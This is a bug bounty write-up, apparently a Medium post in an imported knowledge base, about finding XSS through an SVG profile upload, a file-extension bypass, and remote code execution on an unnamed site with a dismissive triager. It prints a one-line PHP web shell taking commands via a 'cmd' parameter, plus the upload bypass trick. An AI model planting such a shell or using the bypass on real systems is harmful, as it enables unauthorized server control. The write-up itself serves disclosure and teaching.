---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-01-10_my-first-rce-stressed-employee-gets-me-2x-bounty.md
original_filename: 2020-01-10_my-first-rce-stressed-employee-gets-me-2x-bounty.md
title: My First RCE (Stressed Employee gets me 2x bounty)
category: documents
detected_topics:
- xss
- command-injection
- file-upload
- api-security
tags:
- imported
- documents
- xss
- command-injection
- file-upload
- api-security
language: en
raw_sha256: 681f086e959f277fd1d0644f26afaadbf1b08ee847af79dadcb5af8108d3deec
text_sha256: ed8a1cd897bed37c9958362ac3f2c887988d95bc77735ace841863ee0bc5d2da
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# My First RCE (Stressed Employee gets me 2x bounty)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-01-10_my-first-rce-stressed-employee-gets-me-2x-bounty.md
- Source Type: markdown
- Detected Topics: xss, command-injection, file-upload, api-security
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `681f086e959f277fd1d0644f26afaadbf1b08ee847af79dadcb5af8108d3deec`
- Text SHA256: `ed8a1cd897bed37c9958362ac3f2c887988d95bc77735ace841863ee0bc5d2da`


## Content

---
title: "My First RCE (Stressed Employee gets me 2x bounty)"
url: "https://medium.com/@abhishake100/my-first-rce-stressed-employee-gets-me-2x-bounty-c4879c277e37"
authors: ["Abhishek Yadav (@abhishake100)"]
bugs: ["Unrestricted file upload", "RCE"]
bounty: "900"
publication_date: "2020-01-10"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4834
scraped_via: "browseros"
---

# My First RCE (Stressed Employee gets me 2x bounty)

My First RCE (Stressed Employee gets me 2x bounty)
Abhishek
Follow
4 min read
·
Jan 10, 2020

474

2

This was an easy find tbh, but since it was my first and a weird one i would like to share.

Press enter or click to view image in full size

Curated list of Bug Bounty programs — https://bugbountydirectory.com

I had found multiple bugs on the website before (like open redirect, hyperlink Injection, etc) but recently they updated the whole layout of the website and so i thought to look at it again.

Browsing the website i found the file upload functionality to update the profile which wasn’t there before, so i uploaded a svg image and i got XSS.

Press enter or click to view image in full size

I reported it them and i kid you not they replied.

Press enter or click to view image in full size

I was like WTF, this must be some kind of joke as i have sent previous reports and they seem to reply just fine. This was a little too much. Also you can see he sent me gif in the word duped which was this.

I was really angry at the way he replied, i mean the first line was enough to let me know, there was no need to brag about the money and you need to work harder. I didn’t really know how to respond to this, i thought maybe he’s had a tough day at his job and using this just for fun. I really wanted to get back at him but i let go and just waited for them to fix the issue.

A few days pass and its fixed. So i looked to bypass the upload functionality and after a few tries i uploaded the file like xss.svg.jpeg and it worked i got an XSS again. I was happy and thought now is the right time to get back at that guy. So i started writing my report and while i was writing i thought maybe i should try to get RCE by uploading a PHP file.

Get Abhishek’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

At first i simply uploaded a php file with code <?php phpinfo(); ?> and i got the PHP version page and all the details.

Press enter or click to view image in full size

This was enough to prove RCE and so i quickly reported and hoping it was not duped this time. Since it was a bypass i just sent it to the same guy to which he replied.

Press enter or click to view image in full size

I mean what the hell is wrong with this dude. So i contacted their support team and sent all the screenshots of the email showing the way he replied but they didn’t respond. So to prove the guy wrong i uploaded a php file with the code <?php echo "Shell";system($_GET['cmd']); ?> and i got a shell. Now i can just visit the image URL and add ?cmd=[command here] to run any command. Also it didn’t require any authentication that means once i uploaded the shell i can just visit the URL of the image and run any commands i want, no need to log in.

Press enter or click to view image in full size
Press enter or click to view image in full size
Press enter or click to view image in full size

So after i sent all the screenshots of the RCE i get this.

Press enter or click to view image in full size

I kinda knew this was gonna happen at some point and so i made a new report and sent it to the security team as it was a critical bug. After a month and a half of waiting they finally replied.

Press enter or click to view image in full size

I guess that makes for it then. This was one of the weirdest experience i have had in this field. After the incident they removed their bug bounty page from their website and is no longer present. Hope you learned something, if you liked then please share.

Follow me on twitter — https://twitter.com/abhishekY495

Thank You.
